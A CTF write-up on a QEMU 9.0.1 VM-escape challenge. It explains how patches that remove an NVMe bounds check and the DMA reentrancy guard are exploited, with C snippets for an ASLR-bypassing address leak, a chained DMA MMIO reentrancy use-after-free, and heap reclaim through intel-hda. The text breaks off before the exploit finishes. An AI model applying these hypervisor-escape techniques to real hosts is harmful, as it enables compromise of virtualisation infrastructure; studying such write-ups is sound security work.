---
layout: post
title:  "HITCON CTF QUAL 2024 Pwn Challenge Part 2 - reEscape"
categories: ctf
---

## reEscape - QEMU VM Escape

### 1. Introduction

This challenge is based on the latest version of QEMU (9.0.1), which has patched certain logic related to NVMe and DMA MMIO. According to the run script, the guest is enabled to use three types of devices: NVMe, ich9-intel-hda, and rtl8139.

```bash
/home/user/qemu-system-x86_64 \
    \ # [...]
    -device nvme-subsys,id=nvme-subsys-0,nqn=subsys-0,fdp=on,fdp.nruh=128, \
    -device nvme,serial=1234,cmb_size_mb=64,subsys=nvme-subsys-0 \
    -drive file=null-co://,if=none,format=raw,id=nvm-1 \
    -device nvme-ns,drive=nvm-1,nsid=1,fdp.ruhs=0-63 \
    -device ich9-intel-hda,id=sound0,addr=0x1b \
    -device rtl8139
```

In the VM, you can view the memory layout of device MMIOs by reading `/proc/iomem`.

```
# cat /proc/iomem
// [...]
40000000-febfffff : PCI Bus 0000:00
  f8000000-fbffffff : 0000:00:04.0
    f8000000-fbffffff : nvme
  fc000000-fcffffff : 0000:00:02.0
    fc000000-fcffffff : bochs-drm
  feb40000-feb7ffff : 0000:00:03.0
  feb80000-febbffff : 0000:00:05.0
  febc0000-febdffff : 0000:00:03.0
  febf0000-febf3fff : 0000:00:04.0
    febf0000-febf3fff : nvme
  febf4000-febf7fff : 0000:00:1b.0
    febf4000-febf7fff : ICH HD audio
  febf8000-febf8fff : 0000:00:02.0
    febf8000-febf8fff : bochs-drm
  febf9000-febf90ff : 0000:00:05.0
    febf9000-febf90ff : 8139cp
// [...]
```

If you want to communicate with NVMe or other devices, you can mmap file "/dev/mem" using MMIO address as offset.

```c
void *mmio_nvme_bar()
{
    int fd = open("/dev/mem", O_RDWR | O_SYNC);
    void *ptr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0xfebf0000);
    close(fd);
    return ptr;
}
```



### 2. QEMU MMIO

>The codes in the following sections have been **significantly trimmed to remove non-essential parts**. Please refer to the original source code for full details.

QEMU provides emulation for hardware devices, and if a device needs to register a memory mapping in the guest's memory, it will call `memory_region_init_io()` to handle this process when initializing.

Take NVMe for example, the init function `nvme_init_pci()` calls `memory_region_init_io()` with parameters `&nvme_mmio_ops`, `"nvme"`, and `msix_table_offset`. These parameters correspond to the `MemoryRegionOps` object, the name of the mapping, and the size of the mapping.

```c
static bool nvme_init_pci(NvmeCtrl *n, PCIDevice *pci_dev, Error **errp)
{
    // [...]
    memory_region_init_io(&n->iomem, OBJECT(n), &nvme_mmio_ops, n, "nvme",
                        msix_table_offset);
    // [...]
}
```

The `MemoryRegionOps` object is used to define constraints such as the size limits for guest read and write operations, callback functions, and endianness. The `MemoryRegionOps` object for NVMe is `nvme_mmio_ops`, which restricts the access size to be greater than 2 bytes and less than 8 bytes, and specifies that reads and writes are handled by `nvme_mmio_read()` and `nvme_mmio_write()`, respectively.

```c
static const MemoryRegionOps nvme_mmio_ops = {
    .read = nvme_mmio_read,
    .write = nvme_mmio_write,
    .endianness = DEVICE_LITTLE_ENDIAN,
    .impl = {
        .min_access_size = 2,
        .max_access_size = 8,
    },
};
```

When the guest accesses MMIO memory, the current thread will dispatches the access request to device callback function with the address offset, data, and size. For example, the backtrace when `nvme_mmio_write()` is called is as follows:

```
#0  nvme_mmio_write
#1  memory_region_write_accessor
#2  access_with_adjusted_size
#3  memory_region_dispatch_write
#4  int_st_mmio_leN
#5  do_st_mmio_leN
#6  do_st_4
#7  do_st4_mmu
#8  helper_stl_mmu
#9  code_gen_buffer
#10 cpu_tb_exec
#11 cpu_loop_exec_tb
#12 cpu_exec_loop
#13 cpu_exec_setjmp
#14 cpu_exec

# [...]
```


### 3. NVMe

Similar to most devices, the NVMe MMIO write callback `nvme_mmio_write()` also calls different handlers based on the offset (variable `addr`).

```c
static void nvme_mmio_write(void *opaque, hwaddr addr, uint64_t data,
                            unsigned size)
{
    // [...]
    if (addr < sizeof(n->bar) /* 0x1000 */) {
        nvme_write_bar(n, addr, data, size);
    } else {
        nvme_process_db(n, addr, data);
    }
}
```

The `nvme_write_bar()` function updates the corresponding NVMe register based on the offset. Each register has a different function, and you can find this information by referring to the [NVMe specification](https://nvmexpress.org/wp-content/uploads/NVM-Express-Base-Specification-2_0-2021.06.02-Ratified-4.pdf) or, alternatively, by reviewing the code, as I do.

```c
static void nvme_write_bar(NvmeCtrl *n, hwaddr offset, uint64_t data,
                           unsigned size)
{
    // [...]
    switch (offset) {
    case NVME_REG_INTMS:
        // [...]
        break;
    }
    // [...]
}
```

The `nvme_process_db()` function is responsible for handling doorbell requests for both the completion queue (CQ) and the submission queue (SQ). When the doorbell rings for the SQ, it indicates that there are commands in the corresponding qid SQ that need to be executed, which are then scheduled to run in the bottom half (BH) [4].

```c
static void nvme_process_db(NvmeCtrl *n, hwaddr addr, int val)
{
    if (((addr - 0x1000) >> 2) & 1) {
        /* Completion queue doorbell write */
        // [...]
    } else {
        /* Submission queue doorbell write */
        // [...]
        sq = n->sq[qid];
        qemu_bh_schedule(sq->bh); // [4]
    }
}
```

The BH job will be handled by the **main thread**, which calls the device's callback function. From the initialization function `nvme_init_sq()`, we can know that the NVMe callback function is `nvme_process_sq()` [5].

```c
static void nvme_init_sq(NvmeSQueue *sq, NvmeCtrl *n, uint64_t dma_addr,
                         uint16_t sqid, uint16_t cqid, uint16_t size)
{
    // [...]
    sq->bh = qemu_bh_new_guarded(nvme_process_sq, sq, // [5]
                                 &DEVICE(sq->ctrl)->mem_reentrancy_guard);
    // [...]
}
```

The following log is a stack trace recorded when the callback function `nvme_process_sq()` is called by main thread.

```
#0  nvme_process_sq at ../hw/nvme/ctrl.c:7009
#1  aio_bh_call at ../util/async.c:171
#2  aio_bh_poll at ../util/async.c:218
#3  aio_dispatch at ../util/aio-posix.c:423
#4  aio_ctx_dispatch at ../util/async.c:360
#5  g_main_context_dispatch at /lib/x86_64-linux-gnu/libglib-2.0.so.0
#6  glib_pollfds_poll at ../util/main-loop.c:287
#7  os_host_main_loop_wait at ../util/main-loop.c:310
#8  main_loop_wait at ../util/main-loop.c:589
#9  qemu_main_loop at ../system/runstate.c:783
#10 qemu_default_main at ../system/main.c:37
```

The `nvme_process_sq()` function sequentially retrieves commands from the SQ, copies them to a local buffer [6] for processing [7], and finally updates the execution results in the CQ [8].

```c
static void nvme_process_sq(void *opaque)
{
    NvmeSQueue *sq = opaque;
    // [...]
    while (!(nvme_sq_empty(sq) || QTAILQ_EMPTY(&sq->req_list))) {
        nvme_addr_read(n, addr, (void *)&cmd, sizeof(cmd));
        // [...]
        memcpy(&req->cmd, &cmd, sizeof(NvmeCmd)); // [6]
        status = sq->sqid ? nvme_io_cmd(n, req) : // [7]
            nvme_admin_cmd(n, req);
        if (status != NVME_NO_COMPLETE) {
            req->status = status;
            nvme_enqueue_req_completion(cq, req); // [8]
        }
        // [...]
    }
}
```

When the SQ's ID (`sq->sqid`) is 0, it indicates the execution of an admin command and `nvme_admin_cmd()` is called. Admin commands are primarily related to system initialization, configuration, setting changes, and monitoring device status. When the ID is not 0, the `nvme_io_cmd()` function is executed, which handles actual data read and write operations.

Admin commands come in various types, one of which is `NVME_ADM_CMD_GET_LOG_PAGE`. This command is used to retrieve logs generated during the NVMe operation. It calls `nvme_get_log()` to handle the subcommand.

```c
static uint16_t nvme_admin_cmd(NvmeCtrl *n, NvmeRequest *req)
{
    switch (req->cmd.opcode) {
    // [...]
    case NVME_ADM_CMD_GET_LOG_PAGE:
        return nvme_get_log(n, req);
    // [...]
    }
}
```

The subcommand `NVME_LOG_FDP_EVENTS` is used to obtain the event log for Flexible Data Placement (FDP). `nvme_get_log()` will call `nvme_fdp_events()` to handle this subcommand, which is also the patched function in this challenge.

```c
static uint16_t nvme_get_log(NvmeCtrl *n, NvmeRequest *req)
{
    switch (lid) {
    // [...]
    case NVME_LOG_FDP_EVENTS:
        return nvme_fdp_events(n, lspi, len, off, req);
    // [...]
    }
}
```



### 4. ich9-intel-hda

ICH9-Intel-HDA refers to the Intel I/O Controller Hub 9 (ICH9) integrated with Intel High Definition Audio (HDA), and its initialization function is `intel_hda_realize()`.

```c
static void intel_hda_realize(PCIDevice *pci, Error **errp)
{
    // [...]
    memory_region_init_io(&d->mmio, OBJECT(d), &intel_hda_mmio_ops, d,
                          "intel-hda", 0x2000);
    memory_region_add_subregion(&d->container, 0x0000, &d->mmio);
    // [...]
}
```

The Intel HDA `MemoryRegionOps` object is `intel_hda_mmio_ops`, and its write callback is `intel_hda_mmio_write()`.

```c
static const MemoryRegionOps intel_hda_mmio_ops = {
    .read = intel_hda_mmio_read,
    .write = intel_hda_mmio_write,
    // [...]
};
```

Intel HDA defines all register information in the global array `regtab[]`, including the register's name [1], size [2], and callback function [3].

```c
static const struct IntelHDAReg regtab[] = {
    // [...]
    [ ICH6_REG_STATESTS ] = {
        .name     = "STATESTS", // [1]
        .size     = 2, // [2]
        .wmask    = 0x7fff,
        .wclear   = 0x7fff,
        .offset   = offsetof(IntelHDAState, state_sts),
        .whandler = intel_hda_set_state_sts, // [3]
    },
    // [...]
};
```



### 4. RTL8139

RTL8139 refers to emulated NIC that is based on the Realtek RTL8139 chipset, and ts initialization function is `pci_rtl8139_realize()`.

```c
static void pci_rtl8139_realize(PCIDevice *dev, Error **errp)
{
    // [...]
    memory_region_init_io(&s->bar_io, OBJECT(s), &rtl8139_io_ops, s,
                          "rtl8139", 0x100);
    memory_region_init_alias(&s->bar_mem, OBJECT(s), "rtl8139-mem", &s->bar_io,
                             0, 0x100);
    // [...]
}
```

The rtl8139 `MemoryRegionOps` object is `rtl8139_io_ops`, and its write callback is `rtl8139_ioport_write()`.

```c
static const MemoryRegionOps rtl8139_io_ops = {
    .read = rtl8139_ioport_read,
    .write = rtl8139_ioport_write,
    // [...]
};
```

The `rtl8139_ioport_write()` function updates the register based on different offsets, and if the offset is `TxPoll`, it calls `rtl8139_cplus_transmit()` to send a packet.

```c
static void rtl8139_io_writeb(void *opaque, uint8_t addr, uint32_t val)
{
    switch (addr)
    {
        // [...]
        case TxPoll:
            if (val & (1 << 6))
            {
                DPRINTF("C+ TxPoll normal priority transmission\n");
                rtl8139_cplus_transmit(s);
            }
        // [...]
    }
}
```

Although the rtl8139 is not specified as the network device for the VM in the QEMU run script, we can still enable the `TxLoopBack` flag [1] to send packets to itself [2].

```c
static void rtl8139_transfer_frame(RTL8139State *s, uint8_t *buf, int size,
    int do_interrupt, const uint8_t *dot1q_buf)
{
    // [...]
    if (TxLoopBack == (s->TxConfig & TxLoopBack)) // [1]
    {
        // [...]
        qemu_receive_packet(qemu_get_queue(s->nic), buf, size); // [2]
        // [...]
    }
}
```

The `NetClientInfo` object `net_rtl8139_info` defines how and when the rtl8139 receives packets. The member `.can_receive` is a callback used to check the receiving status [3], and the member `.receive` is a callback used to receive packets [4].

```c
static NetClientInfo net_rtl8139_info = {
    // [...]
    .can_receive = rtl8139_can_receive, // [3]
    .receive = rtl8139_receive, // [4]
    // [...]
};
```

In other words, when `TxLoopBack` is set, the function `rtl8139_transfer_frame()` used for sending packets will indirectly call `rtl8139_receive()` to receive the packet.



### 5. Patch

#### 5.1 NVMe

The first patch removes the checks on offset and log size in the handler `nvme_fdp_events()` for the command `NVME_LOG_FDP_EVENTS`.

```diff
diff -ur qemu-9.0.1/hw/nvme/ctrl.c qemu-chal/hw/nvme/ctrl.c
--- qemu-9.0.1/hw/nvme/ctrl.c    2024-06-11 02:35:24.000000000 +0800
+++ qemu-chal/hw/nvme/ctrl.c    2024-06-16 03:19:13.337460193 +0800
@@ -5121,9 +5121,9 @@
 
     log_size = sizeof(NvmeFdpEventsLog) + ebuf->nelems * sizeof(NvmeFdpEvent);
 
-    if (off >= log_size) {
-        return NVME_INVALID_FIELD | NVME_DNR;
-    }
+    // if (off >= log_size) {
+    //     return NVME_INVALID_FIELD | NVME_DNR;
+    // }
```

Before the patch, we could only read data within the log, and both the offset and read size were restricted to stay within the bounds of the log buffer. However, after applying the patch, we can set the offset to be larger than the `log_size`, allowing us to out-of-bounds read the log buffer. This can lead to leaking the data of other objects on the heap, such as **binary addresses** or **heap addresses**.

```c
static uint16_t nvme_fdp_events(NvmeCtrl *n, uint32_t endgrpid,
                                uint32_t buf_len, uint64_t off,
                                NvmeRequest *req)
{
    // [...]
    trans_len = MIN(log_size - off, buf_len);
    elog = g_malloc0(log_size);
    // copy log data
    // [...]
    return nvme_c2h(n, (uint8_t *)elog + off, trans_len, req); // [1]
}
```

To trigger this bug, we first need to specify the address of SQ-0, and it can be done by writing address value to offset `NVME_REG_ASQ`.

```c
static void nvme_write_bar(/*...*/)
{
    // [...]
    switch (offset) {
    case NVME_REG_ASQ:
        stn_le_p(&n->bar.asq, size, data);
        break;
    case NVME_REG_ASQ + 4:
        stl_le_p((uint8_t *)&n->bar.asq + 4, data);
        break;
    // [...]
    }
}
```

Next, we just need to construct a command `NVME_LOG_FDP_EVENTS`, enqueue it to SQ-0, and ring the doorbell of SQ-0 to trigger the bug. To get the leak data, you should provide the physical address of the read buffer.

``` c
cmd.opcode = NVME_ADM_CMD_GET_LOG_PAGE; // subcommand
cmd.cdw10 = (read_len << 16) | NVME_LOG_FDP_EVENTS; // how many data to leak
cmd.cdw11 = (1 << 16);
cmd.cdw12 = read_off; // the offset of elog
cmd.dptr.prp1 = virt_to_phys(leak); // used to store the return value
run_nvme_cmd(&cmd); // enqueue cmd and ring the bell
```

Once successful, there will be a lot of addresses in the read buffer.

```
# /exp
0000: 0x0000000000000000
0008: 0x0000000000000061
0010: 0x00005653e9de4a30
0018: 0x00005653e9de43d0
0020: 0x0000000000000000
# [...] irq error message
0028: 0x00005653e73ff830
0030: 0x0000000000000000
0038: 0x00005653e73ff8bf
0040: 0x00005653e73ff8df
0048: 0x0000000000000000
0050: 0x00005653e9ddde10
# [...]
```

Because the QEMU heap appears stable after booting, the offsets of the leaked heap and binary address remain consistent each time. This indicates that we've successfully **bypassed ASLR**.



#### 5.2 DMA Reentrancy

The second patch removes the check for the DMA MMIO reentrancy guard.

```diff
diff -ur qemu-9.0.1/system/memory.c qemu-chal/system/memory.c
--- qemu-9.0.1/system/memory.c    2024-06-11 02:35:25.000000000 +0800
+++ qemu-chal/system/memory.c    2024-06-16 01:11:01.255485829 +0800
@@ -551,10 +551,10 @@
     if (mr->dev && !mr->disable_reentrancy_guard &&
         !mr->ram_device && !mr->ram && !mr->rom_device && !mr->readonly) {
         if (mr->dev->mem_reentrancy_guard.engaged_in_io) {
-            warn_report_once("Blocked re-entrant IO on MemoryRegion: "
-                             "%s at addr: 0x%" HWADDR_PRIX,
-                             memory_region_name(mr), addr);
-            return MEMTX_ACCESS_ERROR;
+            // warn_report_once("Blocked re-entrant IO on MemoryRegion: "
+            //                  "%s at addr: 0x%" HWADDR_PRIX,
+            //                  memory_region_name(mr), addr);
+            // return MEMTX_ACCESS_ERROR;
         }
         mr->dev->mem_reentrancy_guard.engaged_in_io = true;
         reentrancy_guard_applied = true;
```

The QEMU DMA reentrancy attack has been proven to escape VM in the past, and there have been some studies and presentations on this topic. During solving this challenge, I referred to the following two slides:

- [Resurrecting Zombies - Leveraging advanced techniques of DMA reentrancy to escape QEMU](https://conference.hitb.org/hitbsecconf2023ams/materials/D1T1 - Leveraging Advanced Techniques of DMA Reentrancy to Escape QEMU - Quan Jin & Ao Wang.pdf)
- [Hunting and Exploiting Recursive MMIO Flaws in QEMU/KVM](https://i.blackhat.com/Asia-22/Thursday-Materials/AS-22-Qiuhao-Recursive-MMIO-final.pdf)

Even the root causes and the exploitation methods are different, the core concepts of those DMA reentrancy attacks are the same. An MMIO access on device A triggers an MMIO operation on device B. Device B, in turn, accesses device C's MMIO in a chain reaction, finally looping back to perform another MMIO operation on device A. Since MMIO operations are handled sequentially, the second MMIO operation on device A produces some side effects on the first operation.

Supposed the second MMIO can reset device A, an example execution flow that triggers a UAF on device A is as follows:

1. The guest writes data to device A's MMIO.
2. Device A writes data to device B's MMIO.
3. Device B writes data to device C's MMIO
4. Device C writes data to device A's MMIO, **triggering device A to reset and free some objects**.
5. Device C completes its operation.
6. Device B completes its operation.
7. When device A continues executing, it may **access some freed objects** because step 4 has freed those objects.

Although the root cause involves NVMe performing DMA MMIO access on itself, people who unfamiliar with DMA reentrancy attacks can still refer to [CVE-2021-3929](https://gitlab.com/qemu-project/qemu/-/issues/782) for an explanation of how it works and which object is the UAF victim. Additionally, this CVE was addressed by `nvme_addr_is_iomem()` ([commit log](https://lists.nongnu.org/archive/html/qemu-devel/2022-01/msg04577.html)), and some participants have also noted this fix.

To solve this CTF challnge, understanding where and how each device can perform DMA MMIO operations is crucial to constructing the chain reaction. Identifying these points will allow us to manipulate the sequence of MMIO operations to achieve the desired effect.

The following gadgets are the DMA accesses used in my solution:

```c
// ==================== NVMe ====================
// command: NVME_CMD_IO_MGMT_RECV + NVME_IOMR_MO_RUH_STATUS
static uint16_t nvme_io_mgmt_recv_ruhs(/* ... */)
{
    // [...]
    return nvme_c2h(n, buf, trans_len, req); // from device to guest's dptr
}

// command: NVME_ADM_CMD_GET_FEATURES + NVME_HOST_BEHAVIOR_SUPPORT
static uint16_t nvme_get_feature(/* ... */)
{
    // [...]
    case NVME_HOST_BEHAVIOR_SUPPORT:
        return nvme_c2h(n, (uint8_t *)&n->features.hbs,
                        sizeof(n->features.hbs), req);
    // [...]
}

// ==================== rtl8139 ====================
// register: TxPoll --> send packet loopback
static ssize_t rtl8139_do_receive(/* ... */)
{
    // [...]
    else
    {
        // [...]
        rtl8139_write_buffer(s, (uint8_t *)&val, 4);
        rtl8139_write_buffer(s, buf, size);
        rtl8139_write_buffer(s, (uint8_t *)&val, 4);
        // [...]
    }
}
```



### 6. Exploit

#### 6.1 ASLR Bypass

We've bypassed ASLR in section **"5.1 NVMe"**. For more details, please refer to that section.



#### 6.2 Trigger Assertion

Our goal is to trigger `nvme_ctrl_reset()` through the MMIO of other devices. Upon being triggered, besides resetting the register, this function will also release SQ [1] and CQ [2].

```c
static void nvme_ctrl_reset(NvmeCtrl *n, NvmeResetType rst)
{
    // [...]
        for (i = 0; i < n->params.max_ioqpairs + 1; i++) {
        if (n->sq[i] != NULL) {
            nvme_free_sq(n->sq[i], n); // [1]
        }
    }
    for (i = 0; i < n->params.max_ioqpairs + 1; i++) {
        if (n->cq[i] != NULL) {
            nvme_free_cq(n->cq[i], n); // [2]
        }
    }
    // [...]
}
```

The SQ object (`NvmeSQueue`) and CQ object (`NvmeCQueue`) are created in `nvme_create_sq()` and `nvme_create_cq()`, respectively. The size of the `NvmeSQueue` is 0x80 and the size of the `NvmeCQueue` is 0x70.

```c
static uint16_t nvme_create_sq(NvmeCtrl *n, NvmeRequest *req)
{
    NvmeSQueue *sq;
    // [...]
    sq = g_malloc0(sizeof(*sq)); // 0x80
    // [...]
    return NVME_SUCCESS;
}

static uint16_t nvme_create_cq(NvmeCtrl *n, NvmeRequest *req)
{
    NvmeCQueue *cq;
    // [...]
    cq = g_malloc0(sizeof(*cq)); // 0x70
    // [...]
    return NVME_SUCCESS;
}
```

Since SQ-0 and CQ-0 are the only channels used for handling admin commands, the queue with ID 0 will be ignored during the release process [3].

```c
static void nvme_free_sq(NvmeSQueue *sq, NvmeCtrl *n)
{
    // [...]
    if (sq->sqid) {
        g_free(sq); // [3]
    }
}

static void nvme_free_cq(NvmeCQueue *cq, NvmeCtrl *n)
{
    // [...]
    if (cq->cqid) {
        g_free(cq); // [3]
    }
}
```

Therefore, we need to trigger MMIO while executing non-admin commands. After some investigation, we find that the IO command `NVME_CMD_IO_MGMT_RECV` will call `nvme_io_mgmt_recv_ruhs()` internally. This function calls `nvme_c2h()`, which copies data to the guest's specified physical address.

```c
static uint16_t nvme_io_mgmt_recv_ruhs(/* ... */)
{
    // [...]
    return nvme_c2h(n, buf, trans_len, req);
}
```

If we set the command's descriptor pointer (`dptr.prp1`) to the `TxPoll` offset in the rtl8139 MMIO [4], we can indirectly call the rtl8139's transmit handler `rtl8139_cplus_transmit()`.

```c
memset(&cmd, 0, sizeof(cmd));
cmd.opcode = NVME_CMD_IO_MGMT_RECV;
cmd.nsid = 1;
cmd.cdw10 = NVME_IOMR_MO_RUH_STATUS;
cmd.cdw11 = 1;
cmd.dptr.prp1 = 0xfebf9000 + TxPoll; // [4]
run_nvme_cmd_q2(&cmd);
```

The backtrace leading to `rtl8139_cplus_transmit()` is as follows, with #3 ~ #14 being QEMU functions used for handling memory access:

```
#0  rtl8139_cplus_transmit
#1  rtl8139_io_writeb
#2  rtl8139_ioport_write

#3  memory_region_write_accessor
#4  access_with_adjusted_size
#5  memory_region_dispatch_write
#6  flatview_write_continue_step
#7  flatview_write_continue
#8  flatview_write
#9  address_space_write
#10 address_space_rw
#11 dma_memory_rw_relaxed
#12 dma_memory_rw
#13 dma_buf_rw
#14 dma_buf_read

#15 nvme_tx
#16 nvme_c2h
#17 nvme_io_mgmt_recv_ruhs
#18 nvme_io_mgmt_recv
#19 nvme_io_cmd
#20 nvme_process_sq
```

In section **"4. rtl8139"**, it is mentioned that the rtl8139 can be configured to **loopback data to itself** and specify the address of the receive buffer. The receive packet handler calls `rtl8139_write_buffer()` to store data into that buffer.

```c
static void rtl8139_write_buffer(RTL8139State *s, const void *buf, int size)
{
    // [...]
    pci_dma_write(d, s->RxBuf + s->RxBufAddr, buf, size);
    s->RxBufAddr += size;
}
```

So before executing the `NVME_CMD_IO_MGMT_RECV` command, we can set the address of the receive buffer (`RxBuf`) to the NVMe control register. This setup will trigger the NVMe reset mechanism when the rtl8139 receives packets, thereby executing `nvme_ctrl_reset()`.

```c
// 4 bytes for packet header
*(unsigned int *)(rtl8139_bar + RxBuf) = 0xfebf0000 + NVME_REG_CC - 4;
```

Below is the backtrace when reaching `nvme_ctrl_reset()`, where #23 corresponds to #0 in the previous backtrace:

```
#0  nvme_ctrl_reset
#1  nvme_write_bar
#2  nvme_mmio_write

#3  memory_region_write_accessor
#4  access_with_adjusted_size
#5  memory_region_dispatch_write
#6  flatview_write_continue_step
#7  flatview_write_continue
#8  flatview_write
#9  address_space_write
#10 address_space_rw
#11 dma_memory_rw_relaxed
#12 dma_memory_rw
#13 pci_dma_rw
#14 pci_dma_write

#15 rtl8139_write_buffer
#16 rtl8139_do_receive
#17 rtl8139_receive
#18 nc_sendv_compat
#19 qemu_deliver_packet_iov
#20 qemu_net_queue_deliver
#21 qemu_net_queue_receive
#22 qemu_receive_packet
#23 rtl8139_transfer_frame
```

Since the tx buffer of rtl8139 is controllable, it means that the data written during the DMA write in `rtl8139_write_buffer()` is also controllable. Therefore, when triggering the NVMe MMIO a second time, we can precisely navigate through the various if-else conditions in `NVME_REG_CC` to reach the reset handler [5].

```c
static void nvme_write_bar(NvmeCtrl *n, hwaddr offset, uint64_t data,
                           unsigned size)
{
    // [...]
    case NVME_REG_CC:
        stl_le_p(&n->bar.cc, data);
    
        if (NVME_CC_SHN(data) && !(NVME_CC_SHN(cc))) {
            // [...]
        } else if (!NVME_CC_SHN(data) && NVME_CC_SHN(cc)) {
            // [...]
        }

        if (NVME_CC_EN(data) && !NVME_CC_EN(cc)) {
            // [...]
        } else if (!NVME_CC_EN(data) && NVME_CC_EN(cc)) {
            // [...]
            nvme_ctrl_reset(n, NVME_RESET_CONTROLLER);  // [5]
            break;
        }
        break;
    // [...]
}
```

After successfully causing an UAF on CQ object, QEMU will output the following error message due to an assertion failure:

```
qemu-system-x86_64: ../hw/nvme/ctrl.c:1535: nvme_enqueue_req_completion: Assertion `cq->cqid == req->sq->cqid' failed.
```

The `nvme_enqueue_req_completion()` mentioned in error message is called after executing the `NVME_CMD_IO_MGMT_RECV` command [6].

```c
static void nvme_process_sq(void *opaque)
{
    // [...]
    while (!(nvme_sq_empty(sq) || QTAILQ_EMPTY(&sq->req_list))) {
        status = sq->sqid ? nvme_io_cmd(n, req) :
            nvme_admin_cmd(n, req);
        if (status != NVME_NO_COMPLETE) {
            req->status = status;
            nvme_enqueue_req_completion(cq, req); // [6]
        }
    }
    // [...]
}
```

This function begins with an assertion that compares the expected CQ ID with the actual CQ ID used by the SQ. However, since both the SQ and CQ have already been released in `nvme_ctrl_reset()`, the assertion detects that these values differ and thus aborts the process.

```c
static void nvme_enqueue_req_completion(NvmeCQueue *cq, NvmeRequest *req)
{
    assert(cq->cqid == req->sq->cqid);
    // [...]
}
```



#### 6.3 Reclaim UAF CQ

So, how can we reclaim the freed CQ object? Spoiler: this is where the **ich9-intel-hda** comes into play!

When QEMU allocates memory, instead of using glibc functions such as `malloc()` or `calloc()`, it calls own wrapper functions like `g_malloc()`, `g_malloc0()`, or `g_new()` to allocate memory. Although you can find that both NVMe and rtl8139 have functions that allocate memory, reclaiming the freed SQ object requires satisfying several conditions:

1. **Controllable Content**: The content needs to be controlled to satisfy the `nvme_enqueue_req_completion()` check `cq->cqid == req->sq->cqid`.
2. **Controllable Size**: The allocation size needs to match the size of the CQ object, which is 0x70.
3. **Trigger Conditions**: The allocation must occur after the NVMe reset.

I did not find any memory allocations in NVMe or rtl8139 that met all three conditions at first, but then I found a suitable allocation in the ich9-intel-hda device within the function `intel_hda_parse_bdl()`. This function determines the number of elements based on the controllable register `st->lvi` [1], allocates a `bpl` object of size 0x10 for each element [2], reads data from a specified address [3], and writes it to these objects [4].

```c
static void intel_hda_parse_bdl(IntelHDAState *d, IntelHDAStream *st)
{
    hwaddr addr;
    uint8_t buf[16];
    uint32_t i;

    addr = intel_hda_addr(st->bdlp_lbase, st->bdlp_ubase);
    st->bentries = st->lvi +1; // [1]
    g_free(st->bpl);
    st->bpl = g_new(bpl, st->bentries); // [2]
    for (i = 0; i < st->bentries; i++, addr += 16) {
        pci_dma_read(&d->pci, addr, buf, 16); // [3]
        
        // [4]
        st->bpl[i].addr  = le64_to_cpu(*(uint64_t *)buf);
        st->bpl[i].len   = le32_to_cpu(*(uint32_t *)(buf + 8));
        st->bpl[i].flags = le32_to_cpu(*(uint32_t *)(buf + 12));
    }
    // [...]
}
```

By using this function, we can allocate an object with arbitrary size and data, which is amazing! Even more perfectly, each `IntelHDAStream` object has a BDL, and according to the `regtab[]` definition, there are a total of 8 streams [5]. This means we can totally allocate memory 8 times!

```c
static const struct IntelHDAReg regtab[] = {
    // [...]
    
    // [5]
    HDA_STREAM("IN", 0)
    HDA_STREAM("IN", 1)
    HDA_STREAM("IN", 2)
    HDA_STREAM("IN", 3)

    HDA_STREAM("OUT", 4)
    HDA_STREAM("OUT", 5)
    HDA_STREAM("OUT", 6)
    HDA_STREAM("OUT", 7)
};
```

But how do we trigger this allocation (condition 3)? According to the output of `/proc/iomem`, we can see that the MMIO regions of NVMe and HDA are contiguous.

```
# cat /proc/iomem

# [...]
febf0000-febf3fff : 0000:00:04.0
  febf0000-febf3fff : nvme
febf4000-febf7fff : 0000:00:1b.0
  febf4000-febf7fff : ICH HD audio
# [...]  
```

Since the size of the transmitted data is controllable, we can send data exceeding the NVMe MMIO range and, such as 0x4000 bytes. By doing this, `rtl8139_write_buffer()` will write data from `0xfebf0000 + NVME_REG_CC - 4` to `0xfebf0000 + NVME_REG_CC - 4 + 0x4000`, thereby covering the HDA MMIO range.

Considering that writing to the stream register `ICH6_REG_SD_CTL` triggers the execution of `intel_hda_parse_bdl()` [6],

```c
static const struct IntelHDAReg regtab[] = {
    // [...]
    #define HDA_STREAM(_t, _i)                                        \
    [ ST_REG(_i, ICH6_REG_SD_CTL) ] = {                               \
        .stream   = _i,                                               \
        .name     = _t stringify(_i) " CTL",                          \
        .size     = 4,                                                \
        .wmask    = 0x1cff001f,                                       \
        .offset   = offsetof(IntelHDAState, st[_i].ctl),              \
        .whandler = intel_hda_set_st_ctl,                             \ // [6]
    },
    // [...]
};
```

I set the tx data size to be just enough to write into the `ICH6_REG_SD_CTL` register of the last stream, which is 0x4174 [7]. I also set the `ICH6_REG_SD_LVI` of each stream to 7 before executing this to ensure that `intel_hda_parse_bdl()` will allocate a BDL buffer of size 0x80 [8]. The reason I allocate 0x80 instead of 0x70 is that the freed CQ used a 0x90 chunk.

```c
#define TX_CNT 8
int tx_size = 0x4074 + 0x20 * TX_CNT; // [7]

// [...]

int idx;
for (idx = 0; idx < TX_CNT - 2; idx++) {
    *(unsigned int *)(hda + 0x80 + 0x20 * idx + ICH6_REG_SD_BDLPL) = 0;
    *(unsigned int *)(hda + 0x80 + 0x20 * idx + ICH6_REG_SD_BDLPU) = 0;
    *(unsigned int *)(hda + 0x80 + 0x20 * idx + ICH6_REG_SD_LVI) = 7; // [8]
}

*(unsigned int *)(hda + 0x80 + 0x20 * idx + ICH6_REG_SD_BDLPL) = virt_to_phys(bh);
*(unsigned int *)(hda + 0x80 + 0x20 * idx + ICH6_REG_SD_BDLPU) = 0;
*(unsigned int *)(hda + 0x80 + 0x20 * idx + ICH6_REG_SD_LVI) = 7; // [8]
idx++;

*(unsigned int *)(hda + 0x80 + 0x20 * idx + ICH6_REG_SD_BDLPL) = virt_to_phys(uaf_data); // [9]
*(unsigned int *)(hda + 0x80 + 0x20 * idx + ICH6_REG_SD_BDLPU) = 0;
*(unsigned int *)(hda + 0x80 + 0x20 * idx + ICH6_REG_SD_LVI) = 7; // [8]
```

The first 7 BDL buffers are used to drain the 0x90 tcache and unsorted bin, allowing us to allocate the freed CQ object in the last buffer allocation. Therefore, the `ICH6_REG_SD_BDLPL` of the last stream needs to point to the data written into the CQ object [9].

To construct a fake `NvmeCQueue`, I filled `uaf_data` with the character `'A'` [10] and set the CQID to expected value [11].

```c
int cqid = ((heap + 0x9076f0) >> 16) & 0xffff;
memset(uaf_data, 'A', 0x100); // [10]
*(unsigned long *)(uaf_data + 0xa) = cqid; // [11]
```

If successful, when `nvme_enqueue_req_completion()` is called, the target CQ object should look like this:

```
